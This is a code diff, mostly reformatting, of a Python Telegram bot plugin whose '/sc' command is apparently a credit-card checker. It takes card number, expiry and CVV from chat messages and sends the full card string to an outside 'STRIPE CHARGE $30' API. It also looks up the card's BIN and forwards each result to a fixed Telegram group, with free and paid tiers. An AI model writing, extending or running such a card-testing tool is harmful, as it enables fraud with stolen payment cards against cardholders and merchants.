@@ -1,30 +1,31 @@
-from pyrogram import Client, filters
-import requests
-from urllib.parse import quote_plus
-import json
 import re
 import time
-from plugins.func.users_sql import *
-from datetime import date
+
 import requests
-import json
+from pyrogram import Client, filters
+
+from plugins.func.users_sql import *
+
 session = requests.session()
 
 grp = "-1002122350640"
 
-@Client.on_message(filters.command('sc'))
+
+@Client.on_message(filters.command("sc"))
 async def cmd_au(Client, message):
     try:
         # NES TOOLS
         user_id = str(message.from_user.id)
-        chat_type = str(message.chat.type)
-        chat_id = str(message.chat.id)
+        str(message.chat.type)
+        str(message.chat.id)
         # PLAN CHECK
 
         regdata = fetchinfo(user_id)
         results = str(regdata)
-        if results == 'None':
-            resp = "You Are Not Registered ⚠️. First Register By Using /register To Use Me!"
+        if results == "None":
+            resp = (
+                "You Are Not Registered ⚠️. First Register By Using /register To Use Me!"
+            )
             await message.reply_text(resp, message.id)
         else:
             # HERE
@@ -46,14 +47,14 @@ async def cmd_au(Client, message):
                 antispam_time = int(results[7])
                 now = int(time.time())
                 count_antispam = now - antispam_time
-                if status == 'FREE' and count_antispam < 40:
+                if status == "FREE" and count_antispam < 40:
                     after = 40 - count_antispam
                     resp = f"""
 #ANTI_SPAM ⚠️
 Try After {after}s Or purchase /buy to reduce it!
             """
                     await message.reply_text(resp, message.id)
-                elif status == 'PREMIUM' and count_antispam < 20:
+                elif status == "PREMIUM" and count_antispam < 20:
                     after = 20 - count_antispam
                     resp = f"""
 #ANTI_SPAM ⚠️
@@ -65,7 +66,7 @@ Retry After {after}s
                     if message.reply_to_message:
                         cc = message.reply_to_message.text
                     else:
-                        cc = message.text[len('/sc '):]
+                        cc = message.text[len("/sc ") :]
                     if len(cc) == 0:
                         nocc = """No CCS Found. ⚠️"""
                         return await message.reply_text(nocc, message.id)
@@ -95,7 +96,7 @@ Retry After {after}s
                             mes = input[1]
                             ano = input[2]
                             cvv = input[3]
-                        if len(mes) == 2 and (mes > '12' or mes < '01'):
+                        if len(mes) == 2 and (mes > "12" or mes < "01"):
                             ano1 = mes
                             mes = ano
                             ano = ano1
@@ -122,7 +123,9 @@ Retry After {after}s
 </b>
               """
                         time.sleep(1)
-                        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)
+                        secondchk = await Client.edit_message_text(
+                            message.chat.id, firstchk.id, secondresp
+                        )
                         thirdresp = f"""
 <b> STRIPE CHARGE $30   
 ━━━━━━━━━
@@ -131,10 +134,14 @@ Retry After {after}s
  Response - ■■□□□
 </b>
               """
-                        thirdchk = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)
+                        thirdchk = await Client.edit_message_text(
+                            message.chat.id, secondchk.id, thirdresp
+                        )
                         # STARTED CHECKING CC#
                         tic = time.perf_counter()
-                        authurl = f"https://pussabazar.a1h.in/api/api3.php?lista={fullcc}"
+                        authurl = (
+                            f"https://pussabazar.a1h.in/api/api3.php?lista={fullcc}"
+                        )
                         reqone = session.get(authurl)
                         result = reqone.text
                         fourthresp = f"""
@@ -145,12 +152,13 @@ Retry After {after}s
  Response - ■■■□□
 </b>
               """
-                        fourthchk = await Client.edit_message_text(message.chat.id, thirdchk.id, fourthresp)
+                        fourthchk = await Client.edit_message_text(
+                            message.chat.id, thirdchk.id, fourthresp
+                        )
                         # BIN RESPINSE
                         fbin = cc[:6]
 
-                        bin = session.get(
-                            f"https://lookup.binlist.net/{fbin}").json()
+                        bin = session.get(f"https://lookup.binlist.net/{fbin}").json()
                         try:
                             brand = bin["scheme"].upper()
                         except:
@@ -197,7 +205,9 @@ Retry After {after}s
  Response - ■■■■□
 </b>
               """
-                        fifthchk = await Client.edit_message_text(message.chat.id, fourthchk.id, fifthresp)
+                        fifthchk = await Client.edit_message_text(
+                            message.chat.id, fourthchk.id, fifthresp
+                        )
                         sixresp = f"""
 <b> STRIPE CHARGE $30   
 ━━━━━━━━━
@@ -206,8 +216,10 @@ Retry After {after}s
  Response - ■■■■■
 </b>
               """
-                        sixchk = await Client.edit_message_text(message.chat.id, fifthchk.id, sixresp)
-                    # --------------FINAL RESPONSE ------------#
+                        sixchk = await Client.edit_message_text(
+                            message.chat.id, fifthchk.id, sixresp
+                        )
+                        # --------------FINAL RESPONSE ------------#
 
                         finalresp = f"""
 <b>STRIPE CHARGE $30 
@@ -228,8 +240,10 @@ Retry After {after}s
 ┗－－－－－－－－－－－－－－－－－┛</b>
             """
 
-                        finalchk = await Client.edit_message_text(message.chat.id, sixchk.id, finalresp)
-                        await Client.send_message(grp,finalresp)
+                        await Client.edit_message_text(
+                            message.chat.id, sixchk.id, finalresp
+                        )
+                        await Client.send_message(grp, finalresp)
                         # ANTISPAM TIME SET
                         module_name = "antispam_time"
                         value = int(time.time())
